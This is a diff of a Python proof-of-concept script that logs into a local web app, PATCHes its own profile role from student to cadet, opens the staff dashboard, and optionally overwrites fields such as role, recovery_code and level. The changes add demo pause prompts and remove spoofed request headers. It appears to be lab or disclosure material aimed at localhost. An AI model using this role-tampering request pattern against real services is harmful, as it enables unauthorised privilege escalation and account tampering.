@@ -19,7 +19,8 @@ auth = requests.post(
     data={"identity": identity, "password": password},
     allow_redirects=False
 )
- 
+
+
 cookies = auth.cookies
 if not cookies.get("session"):
     print("Login failed - no session cookie received")
@@ -31,16 +32,21 @@ print(f"{GREEN}Logged in successfully with " + identity + " and " + password )
 
 print(f"{RESET}__________")
 print(f"{CYAN}BEFORE PATCHING{RESET}")
+
+input(f"{GREEN}accessing http://localhost:4942/api/profile")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"CONTINUING.")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"___________________________________________________________________________________________{RESET}")
+
 targeturl = "http://localhost:4942/api/profile"
 
 response = requests.patch(
         targeturl,
         cookies=cookies,
-        headers={
-            "Origin": "http://localhost:4942",
-            "Referer": "http://localhost:4942",
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
-        },
 		json={"role": "student"},
         allow_redirects=False
     )
@@ -60,6 +66,15 @@ if index != -1:
 else:
     print("")
 
+input(f"{GREEN}sending patch request to patch role of joe from student to cadet: ")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"CONTINUING.")
+print("___________________________________________________________________________________________")
+print("___________________________________________________________________________________________")
+print(f"___________________________________________________________________________________________{RESET}")
+
 print(f"{RESET}__________")
 print(f"{CYAN}AFTER PATCHING{RESET}")
 targeturl = "http://localhost:4942/api/profile"
@@ -67,11 +82,6 @@ targeturl = "http://localhost:4942/api/profile"
 response = requests.patch(
         targeturl,
         cookies=cookies,
-        headers={
-            "Origin": "http://localhost:4942",
-            "Referer": "http://localhost:4942",
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
-        },
 		json={"role": "cadet"},
         allow_redirects=False
     )
@@ -96,11 +106,6 @@ targeturl = "http://localhost:4942/staff/dashboard"
 response = requests.get(
         targeturl,
         cookies=cookies,
-        headers={
-            "Origin": "http://localhost:4942",
-            "Referer": "http://localhost:4942",
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
-        },
         allow_redirects=False
     )
 
@@ -127,11 +132,6 @@ if question.strip().lower() == 'y':
     response = requests.patch(
             targeturl,
             cookies=cookies,
-            headers={
-                "Origin": "http://localhost:4942",
-                "Referer": "http://localhost:4942",
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
-            },
             json={"avatar":answer,"campus":answer,"collectionId":"_pb_users_auth_","collectionName":"users","emailVisibility":"false","first_name":answer,"last_name":answer,"level":99.9,"name":answer,"private_note":answer,"pw_hint":answer,"recovery_code":answer,"role":"visitor","username":answer},
             allow_redirects=False
         )
